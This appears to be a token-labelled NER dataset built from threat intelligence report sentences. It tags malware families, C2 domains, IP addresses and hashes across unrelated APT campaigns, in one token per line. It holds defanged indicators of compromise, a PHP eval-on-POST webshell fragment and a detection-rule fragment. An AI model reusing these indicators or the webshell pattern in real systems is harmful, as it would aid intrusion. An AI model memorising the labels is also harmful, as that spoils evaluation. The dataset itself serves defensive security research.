When O
executed O
, O
the O
winsocks.exe B-malware.backdoor
backdoor O
requests O
a O
PHP O
update O
callback O
at O
http[:]//199.91.173[.]43/fetch_updates_8765.php?compname= B-ip.unknown
< O
COMPUTERNAME O
> O
. O

25502 O
2010 O
Different O
03.11 O
. O

application O
to O
view O
mail O
and O
gives O
access O
. O

In O
this O
blog O
post O
we O
dissect O
two O
of O
the O
main O
campaigns O
and O
explain O
how O
they O
work O
. O

All O
materials O
are O
intended O
for O
the O
original O
recipient O
only O
. O

Another O
peculiarity O
, O
is O
the O
name O
of O
the O
function O
where O
is O
present O
the O
code O
for O
the O
HTTPS O
communication O
. O

We O
assist O
and O
coach O
the O
organization O
to O
formulate O
and O
implement O
a O
cyber-event O
handling O
program O
and O
crisis O
level O
situation O
assessment O
and O
decision O
making.info@clearskysec.com O
http://www.clearskysec.com B-url.normal
Minerva O
offers O
a O
low O
footprint O
endpoint O
protection O
platform O
. O

Dark B-malware.backdoor
Comet I-malware.backdoor
version O

Of O
course O
, O
this O
information O
can O
be O
manipulated O
by O
the O
malware O
author O
. O

Most O
recently O
, O
FireEye O
observed O
HIGHTIDE B-malware.backdoor
at O
multiple O
Taiwan-based O
organizations O
and O
the O
suspected O
APT12 O
WATERSPOUT B-malware.backdoor
backdoor O
at O
a O
Japan-based O
electronics O
company O
. O

Such O
information O
can O
be O
used O
to O
manipulate O
a O
victim O
or O
even O
use O
it O
for O
blackmail O
or O
bribery O
. O

A O
200.63.46.23 B-ip.unknown
2 O
www.dvdform.com B-url.unknown
. O

POST O

During O
our O
investigation O
we O
spotted O
three O
instances O
of O
the O
renewed O
operation O
, O
but O
unique O
artifacts O
in O
the O
command O
and O
control O
website O
revealed O
a O
wider O
infrastructure O
that O
may O
well O
manage O
more O
unknown O
samples O
. O

Recently O
, O
the O
Darkhotel B-malware.infosteal
APT O
has O
maintained O
multiple O
working O
directories O
on O
this O
site O
. O

In O
our O
analysed O
sample O
the O
' O
Loveusd.sys O
' O
driver O
is O
installed O
with O
the O
name O
' O
USBHPMS O
' O
. O

Symantec O
has O
seen O
Chafer O
use O
seven O
new O
tools O
in O
its O
more O
recent O
campaigns O
, O
in O
addition O
to O
malware O
it O
is O
previously O
known O
to O
have O
used O
. O

[ O
그림 O
17 O
] O
Andaratm B-malware.backdoor
악성코드의 O
특징적인 O
문자열 O
Andaratm가 B-malware.backdoor
실행되면 O
컴퓨터 O
이름과 O
사용자 O
이름 O
등의 O
정보를 O
획득하며 O
, O
지정된 O
C2 O
서버로 O
접속을 O
시도하 O
고 O
명령을 O
받아 O
수행한다 O
. O

These O
include O
remote O
desktop O
, O
webcam O
spying O
, O
remote O
shell O
, O
and O
file O
management O
. O

Unit O
42 O
used O
the O
Palo O
Alto O
Networks O
AutoFocus O
threat O
intelligence O
service O
to O
locate O
additional O
samples O
using O
the O
' O
cgl-bin O
' O
string O
within O
URLs O
of O
HTTP O
requests O
and O
found O
several O
samples O
of O
the O
Cmwhite B-malware.unknown
tool O
associated O
with O
the O
LURID/Enfal B-malware.unknown
downloader O
, O
as O
seen O
in O
Figure O
2 O
. O

File O
name O
SHA-1 O
hash O

download-mgrwin[.]com B-url.cncsvr
was O
registered O
on O
the O
email O
address O
info@communication-principals[.]com B-url.unknown
, O
purportedly O
belonging O
to O
one O
Nick O
Agroyes O
: O
This O
is O
a O
faked O
record O
, O
but O
the O
same O
address O
was O
used O
to O
register O
other O
domains O
of O
which O
some O
have O
been O
documented O
used O
by O
malware O
- O
alertmymailsnotify[.]com B-url.unknown
, O
communication-principals[.]com B-url.unknown
, O
servicesprocessing[.]com B-url.unknown
and O
websourceing[.]com B-url.unknown
. O

While O
this O
shared O
resource O
is O
noteworthy O
, O
of O
particular O
interest O
is O
that O
it O
has O
also O
been O
used O
in O
other O
campaigns O
. O

Trend O
Micro O
discovered O
the O
ChessMaster O
campaign O
back O
in O
July O
2017 O
as O
part O
of O
our O
monitoring O
efforts O
to O
protect O
our O
customers O
. O

SFX O
settings O
inside O
malicious O
archive O
Figure O
3 O
. O

Stay O
tuned O
for O
Parts O
2-4 O
as O
we O
cover O
File O
Stacking O
, O
Web O
Log O
Review O
, O
and O
Network O
Detection O
. O

This O
campaign O
is O
of O
note O
since O
the O
malware O
goes O
to O
great O
lengths O
to O
replace O
specific O
mobile O
apps O
for O
data O
interception O
. O

The O
attackers O
also O
introduced O
a O
very O
rare O
and O
stealthy O
technique O
to O
communicate O
with O
their O
servers O
and O
exfiltrate O
data O
using O
Microsoft O
Outlook O
. O

APT-TOCS B-malware.infosteal
used O
' O
powershell.exe B-malware.drop
' O
to O
execute O
Shellcode O
scripts O
to O
realize O
remote O
control O
on O
targeted O
system O
. O

Notice O
the O
combination O
of O
India O
and O
China O
references O
here O
. O

We O
immediately O
recognized O
the O
email O
as O
a O
fake O
– O
coming O
from O
an O
unofficial O
address O
- O
idf.cyber@gmail.com B-url.unknown
– O
and O
written O
in O
English O
. O

It O
then O
creates O
a O
hidden O
console O
window O
and O
registers O
its O
only O
export O
_LowLevelKeyboardProc O
@ O
12 O
as O
a O
hook O
procedure O
for O
low-level O
keyboard O
input O
events O
( O
WH_KEYBOARD_LL O
hook O
) O
. O

We O
assume O
that O
the O
actor O
behind O
these O
campaigns O
uses O
several O
different O
malware O
strains O
is O
order O
to O
compromise O
the O
targeted O
infrastructure O
: O
Uroburos B-malware.backdoor
, O
a O
rootkit O
; O
Agent.BTZ/ComRAT B-malware.backdoor
, O
remote O
administration B-malware.backdoor
tools I-malware.backdoor
or O
Linux O
malware O
and O
maybe O
even O
more O
. O

This O
VPS O
also O
hosts O
over O
2,000 O
other O
domains O
, O
most O
of O
which O
are O
.ir O
domains O
. O

Decoy O
document O
with O
personal O
information O
about O
military O
personnel O

This O
script O
called O
' O
up.bat O
' O
sits O
in O
the O
temporary O
folder O
and O
serves O
four O
main O
purposes O
: O
It O
renames O
the O
second O
batch O
script O
from O
tnew.bat O
to O
win32shell.bat O
; O
Assigns O
system O
fi O
le O
attributes O
to O
it O
; O
Modifi O
es O
its O
Access O
Control O
List O
( O
ACL O
) O
to O
be O
easily O
controlled O
; O
as O
well O
as O
legit O
security O
solutions O
like O
360. O
; O
Kills O
all O
scheduled O
tasks O
that O
might O
interfere O
with O
the O
sample O
. O

This O
is O
done O
in O
order O
to O
get O
only O
one O
report O
per O
infected O
host O
. O

It O
was O
Respublika O
's O

In O
November O
2014 O
, O
the O
experts O
of O
the O
G O
DATA O
SecurityLabs O
published O
an O
article O
about O
ComRAT B-malware.backdoor
, O
the O
Agent.BTZ B-malware.backdoor
successor O
. O

Description O

At O
the O
same O
time O
, O
there O
is O
a O
separate O
configuration O
file O
for O
the O
whole O
malicious O
complex O
and O
an O
encrypted O
block O
in O
the O
system O
registry O
that O
defines O
the O
location O
of O
the O
module O
being O
loaded O
and O
name O
of O
the O
process O
for O
injection O
. O

The O
other O
is O
an O
e-mail O
attachment O
calling O
for O
jihad O
against O
Hezbollah O
and O
the O
Assad O
regime O
or O
promising O
interesting O
regional O
news O
. O

It O
appears O
that O
the O
latest O
version O
of O
this O
RAT B-malware.infosteal
is O
3.2 O
and O
is O
being O
sold O
at O
' O
unrecom[.]net B-url.cncsvr
' O
for O
$ O
500 O
( O
Enterprise O
Version O
) O
and O
$ O
200 O
( O
Full O
Version O
) O
. O

Written O
by O
FireEye O
researcher O
Mike O
Spohn O
, O
mftdump O
is O
a O
great O
tool O
for O
extracting O
and O
analyzing O
file O
metadata O
. O

We O
assume O
that O
the O
performed O
COM O
object O
hijacking O
generates O
some O
trouble O
on O
the O
infected O
system O
, O
that O
's O
why O
the O
author O
changed O
related O
things O
in O
the O
next O
version O
. O

< O
O.N.Mishin@chelindbank[.]ru O
> O

For O
the O
Babar B-malware.drop
project O
though O
the O
attackers O
used O
an O
adapted O
version O
of O
SHA-1 O
, O
as O
opposed O
to O
the O
simple O
XOR/ROL O
hash O
algorithm O
which O
was O
used O
in O
the O
Bunny B-malware.unknown
project O
. O

This O
family O
of O
backdoors O
( O
aka O
HTTP O
Tunnel O
) O
is O
Chinese O
in O
origin O
and O
was O
used O
in O
attacks O
against O
Asian O
government O
organizations O
. O

This O
is O
not O
a O
problem O
though O
, O
because O
it O
can O
be O
easily O
decoded O
. O

Cyberkov O
tried O
to O
discover O
the O
attacker O
behind O
this O
malicious O
application O
by O
sinkholing O
the O
malware O
and O
analyzing O
the O
real O
C2 O
. O

The O
file O
was O
requested O
from O
IP O
addresses O
throughout O
Asia O
without O
ever O
returning O
valid O
content O
. O

Yes O
that O
's O
not O
a O
misspelling O
Word O
is O
happy O
to O
open O
this O
RTF O
format O
as O
well O
. O

This O
is O
very O
similar O
to O
the O
method O
described O
by O
FireEye O
in O
their O
blog O
on O
Operation O
Poisoned O
Hurricane O
. O

feedback O
: O
openy0urm1nd O
[ O
@ O
] O
protonmail.ch O

http://news.joins.com/article/19706272 O
http://www.yonhapnews.co.kr/northkorea/2016/06/13/1801000000AKR20160613092851004.HTML O
http://www.etnews.com/20161001000007 O
http://news.khan.co.kr/kh_news/khan_art_view.html?artid=201709061203001&code=940100 O
http://news.chosun.com/site/data/html_dir/2017/10/17/2017101703770.html O
http://www.ddaily.co.kr/news/article.html?no=164197 O

Once O
the O
named O
pipe O
has O
been O
created O
, O
CreateProcessAsUserA O
is O
called O
with O
the O
following O
as O
the O
CommandLine O
parameter O
: O

At O
the O
time O
of O
this O
writing O
, O
the O
People O
Power O
website O
is O
still O
serving O
up O
malicious O
code O
. O

5 O
. O

Backups O
: O
Do O
we O
backup O
all O
critical O
information O
? O

Well O
known O
applications O
supporting O
end-to-end O
encryption O
are O
used O
by O
hundreds O
of O
millions O
of O
folks O
, O
sometimes O
unknowingly O
, O
every O
day O
. O

The O
email O
message O
and O
the O
lure O
documents O
are O
written O
in O
Hebrew O
, O
Arabic O
or O
English O
. O

It O
happens O
to O
be O
an O
instance O
of O
DarkComet B-malware.backdoor
Version O
4.2 O
; O
however O
, O
the O
results O
presented O
here O
apply O
to O
most O
other O
versions O
of O
DarkComet B-malware.backdoor
as O
well O
. O

2016 O
. O

These O
documents O
were O
Excel O
spreadsheets O
. O

While O
this O
is O
a O
trivial O
persistence O
method O
, O
the O
malware O
Payload O
DLL O
has O
the O
ability O
to O
reference O
this O
registry O
key O
during O
the O
un-install O
routine O
, O
which O
will O
be O
described O
later O
. O

Set O
the O
filename O
to O
be O
deleted O
or O
created O
( O
depends O
on O
other O
parameters O
) O

isActiveNetwork O
] O

The O
following O
command O
file O
hex O
editor O
excerpt O
illustrates O
the O
command O
file O
's O
obfuscation O
in O
a O
contrived O
instance O
: O
Offset O
0123456789 O
10 O
11 O
12 O
13 O
14 O
15 O
00000000 O
00000016 O
BB O
6D O
E4 O
40 O
60 O
34 O
CC O
6A O
0A O
B7 O
2A O
' O
mä O
@ O
' O
4Ìj O
·* O

Exploit O
Document O
Filename O
: O

All O
rights O
reserved O
. O

Several O
days O
later O
, O
Inception B-malware.backdoor
will O
send O
a O
second O
spear-phishing O
email O
to O
the O
target O
, O
with O
another O
malicious O
document O
attached O
. O

Figure O
7 O
: O
Screenshot O
of O
the O
CnC O
client O
showing O
capabilities O
of O
the O
Web B-malware.ransom
shell O

The O
malicious O
document O
was O
submitted O
from O
South O
Korea O
to O
Virus O
Total O
on O
December O
29 O
at O
09:04 O
, O
a O
day O
after O
the O
original O
email O
was O
sent O
to O
the O
target O
list O
. O

The O
readings O
are O
encrypted O
using O
an O
RSA O
public O
key O
found O
in O
memory O
( O
whose O
modulus O
begins O
with O
A25A944E O
) O
and O
written O
to O
the O
.dat O
file O
before O
any O
other O
encrypted O
data O
. O

After O
searching O
through O
the O
drive O
we O
found O
that O
there O
were O
three O
VBRs O
that O
all O
seemed O
to O
have O
corresponding O
information O
for O
the O
partitions O
that O
were O
originally O
created O
. O

It O
accesses O
C O
& O
C O
via O
WebDAV O
hosted O
on O
legitimate O
cloud O
storage O
providers O
. O

In O
the O
process O
of O
analyzing O
infected O
servers O
, O
numerous O
websites O
and O
servers O
were O
identified O
that O
the O
attackers O
had O
scanned O
with O
various O
tools O
, O
such O
as O
nmap O
, O
dirsearch O
, O
sqlmap O
, O
etc O
. O

系统研究 O
( O
1 O
) O

These O
appear O
to O
have O
been O
prepared O
for O
email O
distribution O
or O
possibly O
for O
web O
download O
. O

Bunny B-malware.unknown
, O
a O
Lua­based O
backdoor O
, O
documented O
by O
Marion O
Marschalek O
( O
Cyphort O
) O

Perhaps O
because O
many O
of O
these O
campaigns O
were O
designed O
to O
run O
on O
specific O
machines O
, O
using O
English O
and O
Portuguese O
languages O
, O
with O
diverse O
command O
and O
control O
servers O
located O
in O
different O
countries O
and O
soon O
discarded O
, O
signing O
malware O
with O
different O
certificates O
issued O
in O
the O
name O
of O
rogue O
companies O
, O
and O
so O
on O
. O

Following O
are O
traces O
collected O
from O
passive O
DNS O
data O
relevant O
to O
the O
hosts O
involved O
in O
these O
attacks O
: O

2016년 O
6월 O
, O
경찰은 O
중앙관리 O
솔루션의 O
취약점을 O
이용한 O
방위산업 O
관련 O
대기 O
업 O
해킹 O
, O
일명 O
' O
유령 O
쥐 O
작전 O
( O
Operation B-malware.drop
Ghost I-malware.drop
Rat I-malware.drop
) O
' O
을 O
공개했다 O
. O

We O
dug O
deeper O
into O
our O
archives O
and O
found O
APKs O
belonging O
to O
several O
fake O
messenger O
and O
feed O
reader O
apps O
, O
all O
of O
which O
included O
the O
same O
malicious O
modules O
. O

This O
malware O
can O
steal O
and O
send O
sensitive O
information O
to O
the O
attackers O
like O
keystrokes O
, O
opened O
applications O
, O
web O
browsing O
history O
, O
usernames/passwords O
, O
upload O
Desktop O
screen O
shots O
etc O
. O

이 O
로써 O
오퍼레이션 O
블랙 O
마인은 O
안다리엘 O
그룹과 O
연관되었다고 O
추정할 O
수 O
있다 O
. O

We O
can O
not O
exclude O
that O
the O
APT O
group O
developed O
the O
backdoor O
to O
target O
specific O
organizations O
including O
the O
Italian O
Marina O
Militare O
or O
any O
other O
subcontractor O
. O

php.\@eval O
[ O
( O
] O
\ O
$ O
_POST O
. O

Nonetheless O
, O
further O
evidence O
to O
connect O
together O
the O
pieces O
of O
this O
attack O
is O
needed O
, O
as O
well O
as O
insights O
into O
the O
end-goal O
of O
the O
culprits O
. O

First O
is O
the O
' O
ph2 O
, O
' O
which O
could O
mean O
' O
ph O
' O
for O
Philippines O
and O
' O
2 O
' O
as O
its O
second O
directory O
of O
decoy O
documents O
. O

The O
four O
exported O
libraries O
show O
that O
the O
malware O
has O
started O
to O
support O
the O
OLE O
Component O
Object O
Model O
( O
COM O
) O
. O

Figure O
5 O
: O

The O
document O
is O
classified O
as O
TLP O
: O
WHITE O
, O
therefore O
CIRCL O
encourages O
everyone O
to O
share O
this O
analysis O
report O
as-is O
without O
modification O
. O

The O
algorithm O
used O
for O
encryption O
and O
decryption O
is O
RSA O
, O
which O
leverages O
the O
public O
and O
private O
key O
exponents O
included O
in O
Section O
1 O
of O
the O
PowerShell O
script O
. O

The O
majority O
of O
the O
malicious O
documents O
crafted O
by O
the O
malware O
author O
are O
Microsoft O
Office O
Word O
documents O
. O

Upon O
executing O
one O
particular O
sample O
( O
45142b17abd8a17a5e38305b718f3415 O
) O
, O
the O
malware O
beacons O
to O
' O
test.cable-modem.org O
' O
and O
' O
idf.blogsite.org O
' O
. O

It O
will O
first O
attempt O
to O
communicate O
to O
fighthard.mooo.com B-url.unknown
using O
the O
poison O
ivy O
binary O
protocol O
with O
the O
default O
connection O
password O
of O
' O
admin O
' O
. O

This O
ongoing O
campaign O
, O
which O
targets O
universities O
for O
scientific O
and O
technological O
intellectual O
property O
theft O
, O
demonstrates O
a O
fundamental O
lack O
of O
trust O
in O
the O
international O
agreements O
, O
including O
the O
Joint O
Comprehensive O
Plan O
of O
Action O
( O
JCPOA O
) O
. O

In O
the O
middle O
to O
late O
period O
we O
have O
discovered O
its O
evolution O
and O
two O
different O
types O
of O
backdoor O
programs O
. O

Some O
of O
these O
tasks O
include O
legitimate O
Adobe O
services O
The O
new O
win32shell.bat O
script O
is O
subsequently O
scheduled O
to O
run O
as O
a O
task O
under O
the O
' O
Adobe O
Flash O
Updates O
' O
name O
every O
other O
day O
at O
3 O
AM O
with O
the O
' O
down O
' O
parameter O
. O

Google O
Apps O
allows O
organizations O
to O
use O
Gmail O
as O
their O
organizational O
mail O
solution O
. O

CSRI O
was O
also O
observed O
in O
a O
large O
number O
of O
events O
dispatching O
the O
Parsijoo O
bot O
to O
crawl O
websites O
of O
interest O
. O

Screenshot O
of O
the O
final O
payload O
to O
be O
sent O
to O
C O
& O
C O
server O
. O

-Jeong O
Wook O
Oh O
MMPC O

Once O
a O
foothold O
is O
established O
, O
the O
attackers O
use O
PsExec O
, O
Remcom O
, O
and O
SMB O
hacking O
tools O
to O
begin O
moving O
across O
the O
victim O
's O
network O
. O

Prepare O
an O
incident O
response O
plan O
that O
can O
be O
rapidly O
implemented O
in O
case O
of O
a O
cyber O
intrusion O
. O

The O
DragonOK B-malware.infosteal
group O
was O
observed O
hosting O
their O
backend O
HTRAN O
servers O
in O
Jiangsu O
. O

Instead O
of O
just O
one O
new O
variant O
, O
we O
discovered O
four O
different O
versions O
of O
ANEL B-malware.backdoor
: O
5.0.0 O
beta1 O
5.1.1 O
rc O
5.1.2 O
rc1 O
5.2.0 O
rev1 O
The O
different O
versions O
contain O
changes O
in O
the O
ANEL B-malware.backdoor
loader O
and O
the O
main O
ANEL B-malware.backdoor
DLL O
. O

Offset O
in O
the O
Description O
packet O

4 O
. O

Either O
way O
, O
the O
contents O
continued O
to O
be O
actively O
used O
. O

https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=27000 O

SHA256 O
Hash O
eff78c23790ee834f773569b52cddb01dc3c4dd9660f5a476af044ef6fe73894 B-hash
Filename O
na.doc O
Targeted O
Region O
Pakistan O
76e9988dad0278998861717c774227bf94112db548946ef617bfaa262cb5e338 B-hash
Invest O
in O
Turkey.doc O
Turkey O
6edc067fc2301d7a972a654b3a07398d9c8cbe7bb38d1165b80ba4a13805e5ac B-hash
güvenlik O
yönergesi O
. O

All O
rights O
reserved O
. O

REFERENCES O

Actors O
went O
to O
great O
lengths O
to O
make O
the O
malware O
efficient O
and O
effective O
while O
building O
in O
obfuscation O
and O
complexity O
. O

Based O
on O
the O
file O
creation O
timestamps O
as O
well O
as O
the O
app O
signing O
process O
, O
which O
occurred O
on O
28 O
March O
2013 O
, O
CrowdStrike O
has O
determined O
that O
the O
app O
was O
developed O
sometime O
between O
20 O
February O
and O
13 O
April O
2013 O
. O

The O
new O
wave O
of O
attacks O
included O
a O
new O
generation O
of O
USB B-malware.infosteal
stealers I-malware.infosteal
deployed O
by O
Sofacy O
, O
with O
initial O
versions O
dating O
to O
February O
2015 O
. O

Some O
of O
the O
techniques O
might O
have O
also O
an O
impact O
on O
the O
interpretation O
of O
the O
malware O
. O

Command O
Description O
number O

Figure O
4 O
. O

Build O
Date O
[ O
Mon O
Jun O
10 O
18:51:48 O
2013 O
UTC O
] O
Comments O
This O
installation O
was O
built O
with O
Inno O
Setup O
. O

At O
the O
bottom O
of O
several O
of O
the O
pages O
for O
the O
People O
Power O
website O
are O
four O
iFrames O
as O
seen O
in O
this O
screen O
shot O
of O
the O
website O
source O
: O
Those O
links O
, O
with O
the O
exception O
of O
the O
first O
one O
, O
all O
redirect O
to O
exploit O
pages O
on O
the O
Hong O
Kong O
IP O
address O
58.64.178.77 B-ip.unknown
. O

Finally O
, O
and O
of O
most O
interest O
in O
this O
diagram O
, O
the O
central O
node O
at O
the O
bottom O
of O
the O
diagram O
, O
represents O
the O
Command O
and O
Control O
node O
( O
184.22.201[.]27 B-ip.unknown
) O
used O
by O
these O
two O
examples O
. O

1/10 O

The O
sample O
also O
looks O
for O
a O
file O
named O
i4.dt O
in O
the O
same O
directory O
and O
extracts O
the O
contents O
of O
it O
, O
renames O
the O
file O
to O
icone.vbs O
, O
and O
creates O
a O
new O
persistent O
key O
( O
Figure O
9 O
) O
contents O
of O
it O
, O
renames O
the O
file O
to O
icone.vbs O
, O
and O
creates O
a O
new O
persistent O
key O
( O
Figure O
9 O
) O
in O
\Software\Microsoft\Windows\CurrentVersion\Run O
to O
open O
this O
file O
. O

Size O
Complie O
Time O
Import O
Hash O
f9cfda6062a8ac9e332186a7ec0e706a B-hash
49152 O
bytes O
2014-08-25 O
02:10:11 O
864cd776c24a3c653fd89899ca32fe0b B-hash

Also O
of O
particular O
interest O
from O
an O
attribution O
obfuscation O
perspective O
is O
direct O
IP O
crossover O
with O
previous O
Dynamic O
DNS O
domains O
associated O
with O
known O
CN-APT O
activity O
. O

If O
successful O
, O
it O
sends O
a O
request O
to O
hxxp://api-api[.]com/jsonin B-url.unknown
order O
to O
detect O
the O
external O
IP O
of O
the O
victim O
. O

Enforce O
a O
tiered O
administrative O
model O
with O
dedicated O
administrator O
workstations O
and O
separate O
administrative O
accounts O
that O
are O
used O
exclusively O
for O
each O
tier O
to O
prevent O
tools O
, O
such O
as O
Mimikatz O
, O
for O
credential O
theft O
from O
harvesting O
domain-level O
credentials O
. O

Also O
the O
size O
of O
the O
malicious O
PDF O
is O
significantly O
smaller O
than O
the O
non­malicious O
version O
. O

putty.exe O
( O
a O
windows O
SSH O
client O
) O
filezilla.exe O
( O
supports O
ftps O
uploads O
) O
winscp.exe O
( O
a O
windows O
secure O
copy O
application O
, O
providing O
encrypted O
and O
secure O
file O
transfer O
) O
mstsc.exe O
( O
Windows O
Remote O
Desktop O
client O
, O
providing O
an O
encrypted O
connection O
to O
remote O
systems O
) O
mRemoteNG.exe O
( O
a O
remote O
connections O
manager O
supporting O
SSH O
, O
RDP O
, O
and O
other O
encrypted O
protocols O
) O
Also O
included O
in O
StrongPity O
components O
are O
keyloggers O
and O
additional O
data O
stealers O
. O

The O
malware O
monitors O
SWIFT O
Financial O
Application O
( O
FIN O
) O
messages O
, O
by O
parsing O
the O
contents O
of O
the O
files O
*.prc O
and O

To O
lure O
the O
victims O
to O
open O
the O
malicious O
attachment O
the O
email O
subject O
relevant O
to O
the O
victims O
were O
chosen O
and O
to O
avoid O
suspicion O
the O
email O
was O
made O
to O
look O
like O
it O
was O
sent O
by O
a O
person O
associated O
with O
IDSA O
asking O
to O
take O
action O
against O
a O
pending O
case O
as O
shown O
in O
the O
screen O
shot O
below O
. O

These O
data O
will O
be O
later O
used O
in O
the O
C O
& O
C O
communication O
, O
as O
shown O
in O
the O
Wireshark O
screenshot O
below O
. O

Two O
different O
contractors O
( O
or O
more O
) O
are O
typically O
required O
to O
complete O
the O
government-defined O
objective O
. O

The O
malware O
used O
in O
these O
attacks O
employs O
a O
number O
of O
interesting O
techniques O
to O
' O
hide O
in O
plain O
sight O
' O
and O
to O
evade O
dynamic O
malware O
analysis O
systems O
. O

Compromised O
site O

' O
User­Agent O
: O
' O
; O
http_header O
; O
content O
: O
! O

-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-New O
Session O
: O
% O
fully O
qualified O
computer O
name O
% O
% O
timestamp O
% O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O
-- O

The O
attack O
group O
' O
Moafee B-malware.infosteal
' O
( O
named O
after O
their O
command O
and O
control O
infrastructure O
) O
appears O
to O
operate O
out O
of O
the O
Guangdong O
province O
in O
China O
and O
is O
known O
to O
target O
the O
governments O
and O
military O
organizations O
of O
countries O
with O
national O
interests O
in O
the O
South O
China O
Sea O
. O

It O
should O
be O
noted O
that O
the O
image O
requested O
using O
the O
link O
is O
not O
physically O
located O
on O
the O
remote O
server O
. O

In O
this O
blog O
post O
we O
'll O
analyze O
two O
specific O
incidents O
apparently O
targeting O
victims O
in O
Vietnam O
and O
in O
India O
and O
we O
'll O
describe O
the O
capabilities O
of O
the O
custom O
backdoor O
being O
used O
that O
for O
convenience O
( O
and O
to O
our O
knowledge O
, O
for O
a O
lack O
of O
an O
existing O
name O
) O
we O
call O
KeyBoy B-malware.backdoor
, O
due O
to O
a O
string O
present O
in O
one O
of O
the O
samples O
. O

Unfortunately O
, O
this O
file O
was O
no O
longer O
hosted O
at O
tk-in-f156.2bunny[.]com B-url.unknown
for O
further O
analysis O
. O

( O
e.g O
, O
this O
technique O
was O
used O
to O
compromise O
and O
infect O
visitors O
to O
numerous O
Polish O
Government O
websites O
in O
2014 O
) O
. O

We O
have O
learned O
of O
more O
than O
150 O
targets O
in O
these O
countries O
when O
investigating O
a O
breached O
email O
account O
used O
by O
the O
attackers O
to O
send O
further O
malicious O
emails O
. O

The O
first O
time O
the O
client O
connects O
to O
the O
server O
, O
a O
UUID O
is O
returned O
and O
used O
as O
a O
session O
ID O
. O

The O
protection O
is O
enabled O
to O
all O
processes O
except O
for O
ones O
in O
the O
following O
list O
: O
Svchost.exe O
, O
Lsass.exe O
, O
Winlogon.exe O
, O
Services.exe O
, O
Csrss.exe O
, O
ctfmon.exe O
, O
Rundll32.exe O
, O
mpnotify.exe O
, O
update.exe O
. O

T O
he O
initial O
module O
drops O
three O
files O
that O
are O
typical O
for O
Chinese-speaking O
actors O
: O
a O
legit O
Symantec O
pcAnywhere O
( O
IntgStat.exe O
) O
for O
DLL O
side O
loading O
, O
a O
.dll O
launcher O
( O
pcalocalresloader.dll O
) O
and O
the O
last-stage O
decompressor O
( O
thumb.db O
) O
. O

APT19 B-malware.infosteal
phishing O
emails O
from O
this O
campaign O
originated O
from O
sender O
email O
accounts O
from O
the O
' O
@ O
cloudsend[.]net O
' O
domain O
and O
used O
a O
variety O
of O
subjects O
and O
attachment O
names O
. O

netname O
inetnum_start O
inetnum_end O
country O
mnt-by O
created O

A O
200.63.46.23 B-ip.unknown
6 O
news.grouptumbler.com B-url.unknown
. O

Note O
: O
these O
fi O
les O
are O
specifi O
c O
to O
the O
sample O
we O
analyzed O
at O
HBGary O
, O
Inc O
. O

The O
64kb O
lnk O
file O
is O
downloader O
code O
: O
When O
this O
lnk O
file O
is O
executed O
, O
it O
begins O
an O
AJAX-based O
download O
process O
for O
the O
' O
unzip.js O
' O
file O
( O
a07124b65a76ee7d721d746fd8047066 O
) O
on O
openofficev.info O
. O

true-crypt[.]com B-url.unknown
malicious O
StrongPity O
distribution O
site O

We O
infer O
that O
from O
the O
point O
of O
view O
of O
these O
attackers O
, O
not O
all O
attacks O
need O
to O
have O
sophisticated O
malware O
in O
order O
to O
be O
successful O
enough O
to O
be O
worth O
doing O
. O

We O
identified O
a O
new O
variant O
used O
in O
July O
2017 O
named O
G2 O
. O

Given O
the O
sophistication O
of O
the O
code O
and O
how O
well O
the O
operation O
was O
executed O
, O
we O
have O
concluded O
that O
those O
carrying O
it O
out O
have O
previous O
field O
experience O
. O

Once O
the O
infection O
happens O
, O
it O
reports O
to O
the O
command O
and O
control O
servers O
before O
beginning O
a O
complex O
lateral O
movement O
phase O
. O

Since O
2014 O
, O
Symantec O
has O
found O
evidence O
of O
a O
steady O
stream O
of O
attacks O
from O
the O
Inception B-malware.backdoor
Framework I-malware.backdoor
targeted O
at O
organizations O
on O
several O
continents O
. O

The O
number O
of O
active O
connections O
displayed O
on O
the O
Connections O
tab O
grid O
status O
bar O
is O
incremented O
by O
1 O
. O

The O
group O
mounted O
cyberattacks O
against O
various O
computer O
systems O
in O
Ukraine O
; O
systems O
that O
can O
be O
defined O
as O
critical O
infrastructure O
. O

Figure O
1 O
: O
Client O
binary O
viewed O
in O
WinHex O

Using O
the O
leaked O
HackingTeam O
source O
code O
: O

2016 O
. O

Otherwise O
, O
the O
loop O
will O
inspect O
another O
internal O
flag O

2016 O
. O

25 O
July O
2016 O
. O

This O
volume O
of O
traffic O
is O
likely O
to O
represent O
a O
noisy O
scanning O
research O
attempt O
and O
not O
someone O
DoS'ing O
the O
site O
: O
Recorded O
site O
visits O
following O
the O
9th O
are O
likely O
to O
be O
unreliable O
and O
may O
be O
more O
researchers O
, O
responding O
to O
the O
growing O
notoriety O
of O
the O
site O
following O
the O
public O
reports O
on O
the O
9th O
. O

Nevertheless O
, O
it O
is O
not O
entirely O
clear O
how O
and O
when O
the O
attackers O
choose O
to O
use O
the O
RAT B-malware.backdoor
or O
the O
rootkit B-malware.backdoor
or O
whether O
both O
are O
used O
in O
parallel O
. O

Government O
entities O
, O
including O
the O
Central O
Asian O
ones O
also O
were O
a O
target O
for O
this O
actor O
before O
. O

Each O
polling O
attempt O
starts O
from O
a O
state O

It O
is O
possible O
to O
have O
more O
than O
one O
tunnel O
active O
at O
any O
given O
time O
. O

Both O
of O
these O
features O
are O
noteworthy O
and O
may O
provide O
the O
ability O
to O
correlate O
future O
tools O
to O
the O
same O
group O
and/or O
malware O
authors O
. O

The O
malware O
displays O
a O
picture O
as O
expected O
. O

Checks O
if O
process O
is O
running O
in O
a O
virtualized O
environment O
. O

There O
is O
also O
evidence O
that O
it O
attempted O
to O
attack O
a O
major O
international O
travel O
reservations O
 rm O
. O

The O
first O
two O
hexadecimal O
bytes O
of O
the O
payload O
data O
are O
0x9B O
0x8A O
, O
but O
they O
should O
start O
with O
0x4D O
0x5A O
, O
the O
bytes O
for O
the O
ASCII O
characters O
' O
MZ O
' O
. O

ct.datangcun[.]20120509_CT B-url.cncsvr
V2.1 O

Keywords O
: O
advanced O
